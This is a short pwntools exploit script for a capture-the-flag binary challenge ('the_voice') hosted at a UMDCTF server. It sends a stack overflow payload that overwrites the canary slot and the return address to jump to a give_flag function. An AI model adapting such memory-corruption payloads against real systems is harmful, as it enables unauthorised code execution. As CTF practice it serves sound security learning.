#!/usr/bin/env python3

from pwn import *

e = ELF("the_voice")
symbols = e.symbols
log.info(symbols["give_flag"])
target = "remote"
context.terminal =["tmux", "new-window"] 

if target == "debug":
    io = gdb.debug(e.path,'''
    break *main+131
    ''')
elif target == "remote":
    # nc challs.umdctf.io 31192
    io = remote("challs.umdctf.io", 31192)
else:
    io = process(e.path)

# prompt
log.info(io.recvline())

addr = p64(symbols["give_flag"], endian='little')
log.info(addr)
log.info(addr.hex())

# hex(15*8 - 0x50) == 0x28
canary_offset = cyclic_find("faaa")
payload = b"15\x00\x00" + b"a" * 20 + b"\xcf\x27\x00\x00\x00\x00\x00\x00" # + cyclic(100) 
payload = payload + b"b" * 8 + addr 
io.sendline(payload)


x = io.recvall()
log.info(x)
io.interactive()
